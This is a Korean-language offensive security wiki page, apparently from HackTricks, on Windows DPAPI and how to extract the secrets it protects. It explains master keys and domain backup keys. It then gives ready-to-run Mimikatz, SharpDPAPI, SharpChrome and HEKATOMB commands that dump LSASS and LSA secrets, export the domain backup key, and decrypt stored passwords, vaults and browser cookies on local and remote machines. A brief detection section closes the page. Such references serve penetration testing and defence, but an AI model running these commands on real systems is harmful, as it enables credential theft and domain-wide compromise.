# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란 무엇인가

데이터 보호 API(DPAPI)는 주로 Windows 운영 체제 내에서 **비대칭 개인 키의 대칭 암호화**에 사용되며, 사용자 또는 시스템 비밀을 중요한 엔트로피 소스로 활용합니다. 이 접근 방식은 개발자가 사용자의 로그인 비밀 또는 시스템 암호화의 경우 시스템의 도메인 인증 비밀에서 파생된 키를 사용하여 데이터를 암호화할 수 있게 하여 암호화 관리를 간소화합니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `CryptUnprotectData`** 함수를 통해 이루어지며, 이 함수들은 애플리케이션이 현재 로그인된 프로세스의 세션으로 데이터를 안전하게 암호화하고 복호화할 수 있게 합니다. 이는 암호화된 데이터가 암호화한 동일한 사용자 또는 시스템에 의해서만 복호화될 수 있음을 의미합니다.

또한, 이 함수는 암호화 및 복호화 중에 사용될 **`entropy` 매개변수**도 수용합니다. 따라서 이 매개변수를 사용하여 암호화된 것을 복호화하려면 암호화 중에 사용된 동일한 엔트로피 값을 제공해야 합니다.

### 사용자 키 생성

DPAPI는 각 사용자의 자격 증명을 기반으로 고유한 키( **`pre-key`** 라고 함)를 생성합니다. 이 키는 사용자의 비밀번호와 기타 요소에서 파생되며, 알고리즘은 사용자 유형에 따라 다르지만 최종적으로 SHA1이 됩니다. 예를 들어, 도메인 사용자의 경우 **사용자의 HTLM 해시에 따라 다릅니다**.

이는 공격자가 사용자의 비밀번호 해시를 얻을 수 있다면 다음을 수행할 수 있기 때문에 특히 흥미롭습니다:

- **DPAPI를 사용하여 암호화된 모든 데이터를** 해당 사용자의 키로 복호화할 수 있으며, API에 연락할 필요가 없습니다.
- **비밀번호를 오프라인에서 크랙**하여 유효한 DPAPI 키를 생성하려고 시도할 수 있습니다.

또한, 사용자가 DPAPI를 사용하여 데이터를 암호화할 때마다 새로운 **마스터 키**가 생성됩니다. 이 마스터 키가 실제로 데이터를 암호화하는 데 사용됩니다. 각 마스터 키는 이를 식별하는 **GUID**(전역 고유 식별자)가 부여됩니다.

마스터 키는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉토리에 저장되며, 여기서 `{SID}`는 해당 사용자의 보안 식별자입니다. 마스터 키는 사용자의 **`pre-key`**로 암호화되어 저장되며, 복구를 위해 **도메인 백업 키**로도 암호화되어 저장됩니다(즉, 동일한 키가 2개의 서로 다른 비밀번호로 2번 암호화되어 저장됨).

도메인 키는 마스터 키를 암호화하는 데 사용되며 도메인 컨트롤러에 있으며 절대 변경되지 않으므로, 공격자가 도메인 컨트롤러에 접근할 수 있다면 도메인 백업 키를 검색하고 도메인 내 모든 사용자의 마스터 키를 복호화할 수 있습니다.

암호화된 블롭은 데이터 암호화에 사용된 **마스터 키의 GUID**를 헤더에 포함하고 있습니다.

> [!NOTE]
> DPAPI 암호화된 블롭은 **`01 00 00 00`**로 시작합니다.

마스터 키 찾기:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
이것은 사용자의 여러 마스터 키가 어떻게 생겼는지를 보여줍니다:

![](<../../images/image (1121).png>)

### 머신/시스템 키 생성

이 키는 머신이 데이터를 암호화하는 데 사용됩니다. **DPAPI_SYSTEM LSA 비밀**을 기반으로 하며, 이는 SYSTEM 사용자만 접근할 수 있는 특별한 키입니다. 이 키는 머신 수준의 자격 증명이나 시스템 전반의 비밀과 같이 시스템 자체에서 접근해야 하는 데이터를 암호화하는 데 사용됩니다.

이 키는 **도메인 백업이 없으므로** 로컬에서만 접근할 수 있다는 점에 유의하십시오:

- **Mimikatz**는 다음 명령어를 사용하여 LSA 비밀을 덤프하여 접근할 수 있습니다: `mimikatz lsadump::secrets`
- 비밀은 레지스트리에 저장되므로, 관리자가 **DACL 권한을 수정하여 접근할 수 있습니다**. 레지스트리 경로는: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`입니다.


### DPAPI에 의해 보호된 데이터

DPAPI에 의해 보호되는 개인 데이터는 다음과 같습니다:

- Windows 자격 증명
- Internet Explorer 및 Google Chrome의 비밀번호 및 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호, 암호화 키 포함
- 원격 데스크톱 연결, .NET Passport 및 다양한 암호화 및 인증 목적을 위한 개인 키의 비밀번호
- Credential Manager에 의해 관리되는 네트워크 비밀번호 및 CryptProtectData를 사용하는 애플리케이션의 개인 데이터, 예: Skype, MSN 메신저 등
- 레지스터 내의 암호화된 블롭
- ...

시스템 보호 데이터에는 다음이 포함됩니다:
- Wifi 비밀번호
- 예약된 작업 비밀번호
- ...

### 마스터 키 추출 옵션

- 사용자가 도메인 관리자 권한을 가지고 있다면, 도메인 내 모든 사용자 마스터 키를 복호화하기 위해 **도메인 백업 키**에 접근할 수 있습니다:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면 **LSASS 메모리에 접근**하여 모든 연결된 사용자의 DPAPI 마스터 키와 SYSTEM 키를 추출할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자가 로컬 관리자 권한을 가지고 있다면, **DPAPI_SYSTEM LSA 비밀**에 접근하여 머신 마스터 키를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 비밀번호 또는 NTLM 해시가 알려져 있다면, **사용자의 마스터 키를 직접 복호화할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자의 세션에 있는 경우, **RPC를 사용하여 마스터 키를 복호화하기 위한 백업 키를 DC에 요청할 수 있습니다**. 로컬 관리자인 경우 사용자가 로그인한 상태에서 **그의 세션 토큰을 훔칠 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 목록 금고
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화된 데이터 접근

### DPAPI 암호화된 데이터 찾기

일반 사용자의 **보호된 파일**은 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 변경하여 확인해 보세요.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 블롭에서 DPAPI로 암호화된 블롭을 찾을 수 있습니다:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
다음의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (같은 레포에서) 를 사용하여 DPAPI를 통해 쿠키와 같은 민감한 데이터를 복호화할 수 있습니다.

### 액세스 키 및 데이터

- **SharpDPAPI**를 사용하여 현재 세션의 DPAPI 암호화된 파일에서 자격 증명을 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **자격 증명 정보**를 가져옵니다. 암호화된 데이터와 guidMasterKey와 같은.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **마스터키 접근**:

RPC를 사용하여 **도메인 백업 키**를 요청하는 사용자의 마스터키를 복호화합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 도구는 마스터 키 복호화를 위한 이러한 인수도 지원합니다 (도메인 백업 키를 얻기 위해 `/rpc`를 사용하거나, 평문 비밀번호를 사용하기 위해 `/password`를 사용하거나, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`를 사용할 수 있는 방법에 유의하세요...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **마스터 키를 사용하여 데이터 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 도구는 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위한 이러한 인수도 지원합니다 (도메인 백업 키를 얻기 위해 `/rpc`를 사용하고, 일반 텍스트 비밀번호를 사용하기 위해 `/password`, DPAPI 도메인 개인 키 파일을 지정하기 위해 `/pvk`, 현재 사용자의 세션을 사용하기 위해 `/unprotect`를 사용할 수 있는 방법에 주목하세요...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **현재 사용자 세션**을 사용하여 일부 데이터 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### 다른 머신 데이터 접근

**SharpDPAPI와 SharpChrome**에서는 원격 머신의 데이터에 접근하기 위해 **`/server:HOST`** 옵션을 지정할 수 있습니다. 물론 해당 머신에 접근할 수 있어야 하며, 다음 예제에서는 **도메인 백업 암호화 키가 알려져 있다고 가정합니다**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉토리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 스크립트는 모든 컴퓨터의 IP 주소를 확인하고 모든 컴퓨터에서 smbclient를 수행하여 모든 사용자의 DPAPI 블롭을 검색하고 도메인 백업 키로 모든 것을 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록을 사용하면 알지 못했던 모든 서브 네트워크를 찾을 수 있습니다!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다.

### 일반적인 탐지

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉토리의 파일 접근.
- C$ 또는 ADMIN$와 같은 네트워크 공유에서의 접근.
- LSASS 메모리에 접근하기 위한 Mimikatz 사용.
- 이벤트 **4662**: 객체에 대한 작업이 수행되었습니다.
- 이 이벤트를 확인하여 `BCKUPKEY` 객체에 접근했는지 확인할 수 있습니다.

## 참고 문헌

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
